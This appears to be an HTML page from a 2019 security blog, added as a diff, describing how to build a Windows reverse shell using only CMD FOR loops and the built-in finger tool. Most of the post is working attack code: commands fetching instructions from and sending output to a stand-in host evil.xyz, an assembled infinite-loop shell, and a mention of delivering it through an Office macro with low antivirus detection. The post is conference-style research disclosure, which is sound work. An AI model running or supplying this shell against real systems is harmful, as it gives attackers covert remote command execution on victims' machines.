@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Joakim Kennedy">
+    <meta name="description" content="My space where I share my thoughts">
+    <meta name="keywords" content="blog,developer,hacks,security,malware">
+
+    <base href="">
+    <title>
+  Backdoor on windows with finger · cat /dev/mem
+</title>
+
+    <link rel="canonical" href="../../posts/finger-windows-backdoor/">
+
+    <link  rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700">
+    <link rel="stylesheet" href="//cdn.rawgit.com/necolas/normalize.css/master/normalize.css">
+    <link rel="stylesheet" href="../../css/style.min.css">
+
+    <link rel="icon" type="image/png" href="../../images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="../../images/favicon-16x16.png" sizes="16x16">
+
+    
+
+    <meta name="generator" content="Hugo 0.54.0" />
+  </head>
+
+  <body>
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="../../">
+      cat /dev/mem
+    </a>
+    
+    <ul class="navigation-list float-right">
+      
+      <li class="navigation-item">
+        <a class="navigation-link" href="../../posts/">Blog</a>
+      </li>
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+  <article>
+    <header>
+      <h1 class="title">Backdoor on windows with finger</h1>
+      <h2 class="date">March 17, 2019</h2>
+    </header>
+
+    
+
+<h1 id="introduction">Introduction</h1>
+
+<p>This is a follow-up post to one of my presentations at BsidesSF 2019. It is
+also a continuation of a <a href="../../posts/whois-and-finger-reverse-shell/">previous blog post</a> where it showed how you can use
+WHOIS and Finger on Unix systems for backdoors. In this post, the focus will
+be on how it can similarly be done on a Windows system.</p>
+
+<p>Finger comes pre-installed on Windows. According to Microsoft&rsquo;s <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/finger">documentation</a>,
+the options are very limited. For example, it does not support using any other
+ports than the standard port 79. In addition, Windows&rsquo; CMD is much more
+limiting than a standard Unix shell and the goal is to do this without using
+a scripting environment; i.e., no Powershell, VBScript or JScript allowed.</p>
+
+<h1 id="the-method-to-the-madness">The method to the madness</h1>
+
+<p>To achieve our goal of creating a reverse shell using only finger and Windows&rsquo;
+command line, a number of things need to be done.</p>
+
+<ol>
+<li>Get command from the server.</li>
+<li>Extract the command from the output from finger.</li>
+<li>Execute the command and capture the output.</li>
+<li>Send the command output back to the server.</li>
+</ol>
+
+<h2 id="get-the-command-from-the-server">Get the command from the server</h2>
+
+<p>One of the limiting functionality in CMD, is how you can assign values to variables.
+It&rsquo;s only possible within a few operations. One is the <code>FOR</code> command. This command
+allows for executing a command and assign the output to an iteration variable. By
+default, it breaks the value on whitespace character but the argument <code>delims=^=^</code>
+makes it instead of break on a newline. So the snippet below will assign the output
+from the finger command to <code>%x</code> line-by-line.</p>
+
+<pre><code>FOR /F delims^=^ %x IN ('finger &quot;message to server&quot;@evil.xyz') DO (## Action on each line ##)
+</code></pre>
+
+<p>As with finger for Unix, the first lines are information to the user that needs to
+be skipped. Luckily, the <code>FOR</code> command has an argument to skip. So the command can
+be fixed to only capture the command instruction from the server and execute it.</p>
+
+<pre><code>FOR /F delims^=^ skip^=^2 %x IN ('finger &quot;message to server&quot;@evil.xyz') DO (
+%x
+)
+</code></pre>
+
+<h2 id="capture-the-command-output-and-send-it-to-the-server">Capture the command output and send it to the server</h2>
+
+<p>To capture the output from the command, we can use a second <code>FOR</code> loop. This one
+executes the command from the server and captures the output line by line. For
+each output line, executes a new instance of finger that sends the output back.</p>
+
+<pre><code>FOR /f &quot;delims=^&quot; %y IN ('%x') DO finger &quot;%y&quot;@evil.xyz
+</code></pre>
+
+<h2 id="putting-it-all-together">Putting it all together</h2>
+
+<p>A functional reverse shell can be achieved by wrapping the two <code>FOR</code> loops with
+an infinite loop:</p>
+
+<pre><code>FOR /L %N IN () DO (
+    for /F delims^=^ skip^=2 %x IN ('finger &quot;cmd&quot;@evil.xyz') DO
+        FOR /f &quot;delims=^&quot; %y IN ('%x') DO
+            finger &quot;%y&quot;@evil.xyz
+)
+</code></pre>
+
+<p>Voila! A reverse shell on Windows using three <code>FOR</code> loops and finger.</p>
+
+<h1 id="poc">PoC</h1>
+
+<p>As a PoC, the shell technique can be used in an Office macro to download and
+execute commands. The image below shows the macro.</p>
+
+<p><img src="../../images/finger-macro.png" alt="Macro using finger" /></p>
+
+<p>The first scan on VirusTotal resulted in detection of six AV products:</p>
+
+<p><img src="../../images/finger-vt-results.png" alt="VT scanning results" /></p>
+
+  </article>
+</section>
+
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    © 2019 · Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+  </section>
+</footer>
+
+    </main>
+
+    
+
+  </body>
+
+</html>
